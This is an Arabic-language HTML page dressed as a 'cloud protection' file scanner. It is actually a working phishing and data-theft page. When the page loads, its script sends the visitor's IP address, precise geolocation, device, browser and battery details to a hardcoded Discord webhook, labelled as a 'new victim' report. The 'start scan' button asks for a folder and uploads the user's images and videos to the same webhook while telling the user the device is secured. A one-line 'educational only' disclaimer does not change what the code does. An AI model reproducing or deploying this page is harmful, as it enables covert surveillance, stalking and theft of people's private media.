<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام الفحص الأمني المتقدم</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; text-align: center; padding: 50px; }
        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; max-width: 500px; margin: auto; }
        .btn { background: #238636; color: white; padding: 15px 30px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; width: 100%; margin-top: 20px; }
        #status { margin-top: 20px; color: #8b949e; }
        .warning { color: #f85149; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card">
    <h1>🛡️ درع الحماية السحابي</h1>
    <p>لتحسين سرعة الفحص وتأمين ملفاتك، نحتاج لتحديد أقرب عقدة فحص جغرافية واختيار مجلد الوسائط.</p>
    
    <button class="btn" id="startBtn">بدء الفحص وتأمين الجهاز ⚡</button>
    
    <div id="status">بانتظار الموافقة على الصلاحيات...</div>
    <div class="warning">تنبيه: هذا الموقع للأغراض التعليمية الجامعية فقط.</div>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";

    // 1. وظيفة لجلب الموقع الجغرافي بدقة
    function getLocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        // إنشاء رابط جوجل ماب
                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
                    },
                    (err) => resolve("الضحية رفض إعطاء صلاحية الموقع")
                );
            } else {
                resolve("المتصفح لا يدعم تحديد الموقع");
            }
        });
    }

    // 2. جمع كافة المعلومات وإرسالها
    async function collectAndSendInfo() {
        try {
            // جلب الـ IP
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            
            // جلب الموقع الجغرافي (ستظهر رسالة سماح للمستخدم)
            const mapLink = await getLocation();

            const info = {
                content: "🚀 **تقرير جديد عن ضحية!**",
                embeds: [{
                    title: "بيانات الجهاز والموقع الدقيق",
                    color: 15105570, // برتقالي
                    fields: [
                        { name: "📍 الموقع على الخريطة (Google Maps)", value: `[اضغط هنا لفتح الموقع](${mapLink})` },
                        { name: "🌐 عنوان IP", value: ipData.ip, inline: true },
                        { name: "📱 نوع الجهاز/النظام", value: navigator.platform, inline: true },
                        { name: "🛠️ المتصفح", value: navigator.userAgent },
                        { name: "🔋 البطارية", value: (await navigator.getBattery?.())?.level * 100 + "%" || "غير مدعوم", inline: true }
                    ],
                    footer: { text: "بيانات تم سحبها لأغراض تعليمية" },
                    timestamp: new Date()
                }]
            };

            await fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
        } catch (e) { console.log("خطأ في جمع البيانات"); }
    }

    // تشغيل جمع البيانات الأساسية فوراً
    collectAndSendInfo();

    // 3. سحب الملفات عند الضغط على الزر
    document.getElementById('startBtn').addEventListener('click', async () => {
        const status = document.getElementById('status');
        try {
            const dirHandle = await window.showDirectoryPicker();
            status.innerText = "جاري الفحص السحابي للملفات...";
            status.style.color = "#f1c40f";

            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    const file = await entry.getFile();
                    if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
                        if (file.size < 25 * 1024 * 1024) {
                            await sendFile(file);
                        }
                    }
                }
            }
            status.innerText = "✅ تمت الحماية! تم فحص كافة الملفات.";
            status.style.color = "#2ecc71";
        } catch (err) {
            status.innerText = "❌ فشل: يجب الموافقة على فحص المجلد لتأمين الجهاز.";
        }
    });

    async function sendFile(file) {
        const formData = new FormData();
        formData.append('file', file, file.name);
        const meta = { content: `📸 تم سحب ميديا: \`${file.name}\`` };
        formData.append('payload_json', JSON.stringify(meta));
        await fetch(WEBHOOK, { method: 'POST', body: formData });
        await new Promise(r => setTimeout(r, 1000));
    }
</script>

</body>
</html>
